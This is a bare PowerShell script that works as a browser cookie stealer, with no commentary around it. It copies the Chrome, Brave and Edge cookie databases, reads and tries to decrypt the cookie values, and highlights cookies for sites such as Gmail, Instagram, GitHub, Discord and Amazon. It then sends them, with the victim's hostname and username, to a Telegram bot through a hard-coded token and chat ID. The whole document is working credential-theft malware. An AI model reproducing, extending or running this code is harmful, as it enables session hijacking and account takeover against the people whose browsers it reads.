

$BotToken = "8770095089:AAFs6Z4raZGnwTqL1aJdDEjVWeu5fa7okZw"
$ChatID = "962420340"

function Get-Cookies {
    param($BrowserName, $CookiePath)
    
    if (!(Test-Path $CookiePath)) { return }
    
    # Copy to temp (unlock the file)
    $tmp = "$env:TEMP\cookies_temp.db"
    Copy-Item $CookiePath $tmp -Force
    
    # Query SQLite
    $conn = New-Object -ComObject ADODB.Connection
    $conn.Open("Driver={SQLite3 ODBC Driver};Database=$tmp;")
    $query = "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly, samesite FROM cookies"
    $rs = $conn.Execute($query)
    
    $cookies = @()
    while (!$rs.EOF) {
        $cookies += @{
            domain = $rs.Fields("host_key").Value
            name = $rs.Fields("name").Value
            encrypted_value = $rs.Fields("encrypted_value").Value
            path = $rs.Fields("path").Value
            expires = $rs.Fields("expires_utc").Value
            secure = $rs.Fields("is_secure").Value
            httpOnly = $rs.Fields("is_httponly").Value
            sameSite = $rs.Fields("samesite").Value
        }
        $rs.MoveNext()
    }
    $conn.Close()
    Remove-Item $tmp -Force
    
    return $cookies
}

function Decrypt-Value($encrypted) {
    if (!$encrypted -or $encrypted.Length -eq 0) { return "" }
    try {
        $decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(
            [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR(
                [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, 'CurrentUser')
            )
        )
        return $decrypted
    } catch {
        return "[encrypted]"
    }
}

function Send-ToTelegram($text) {
    $body = @{ chat_id = $ChatID; text = $text; parse_mode = "HTML" } | ConvertTo-Json
    irm -Uri "https://api.telegram.org/bot$BotToken/sendMessage" -Method POST -Body $body -ContentType "application/json" | Out-Null
}

# ============ MAIN ============
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

$browsers = @(
    @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"},
    @{Name="Brave"; Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"},
    @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"}
)

$allCookies = @()
$priority = @('instagram.com', 'facebook.com', 'youtube.com', 'gmail.com', 'google.com',
              'twitter.com', 'x.com', 'linkedin.com', 'github.com', 'reddit.com',
              'tiktok.com', 'discord.com', 'amazon.com', 'netflix.com', 'spotify.com')

foreach ($browser in $browsers) {
    $cookies = Get-Cookies -BrowserName $browser.Name -CookiePath $browser.Path
    if ($cookies) {
        foreach ($c in $cookies) {
            $c['browser'] = $browser.Name
            $c['value'] = Decrypt-Value($c.encrypted_value)
            $c.Remove('encrypted_value')
        }
        $allCookies += $cookies
    }
}

# Group by domain
$grouped = $allCookies | Group-Object domain

# Build message
$msg = "📦 <b>FULL COOKIE DUMP</b>`n💻 $hostname\$username`n🕐 $timestamp`n🍪 $($allCookies.Count) cookies`n`n━━━ <b>MAJOR PLATFORMS</b> ━━━`n"

foreach ($domain in $priority) {
    $found = $grouped | Where-Object { $_.Name -like "*$domain*" }
    if ($found) {
        $count = ($found.Group | Measure-Object).Count
        $msg += "`n🔑 <b>$domain</b> ($count cookies)`n"
        foreach ($c in $found.Group | Select-Object -First 5) {
            $val = if ($c.value.Length -gt 40) { $c.value.Substring(0,40) + "..." } else { $c.value }
            $msg += "  • <code>$($c.name)</code> = $val $($c.browser)`n"
        }
    }
}

# Send in chunks
$chunks = [Math]::Ceiling($msg.Length / 4000)
for ($i = 0; $i -lt $chunks; $i++) {
    $chunk = $msg.Substring($i * 4000, [Math]::Min(4000, $msg.Length - $i * 4000))
    Send-ToTelegram $chunk
}

Send-ToTelegram "✅ Dump complete. Use /export domain.com for structured JSON."
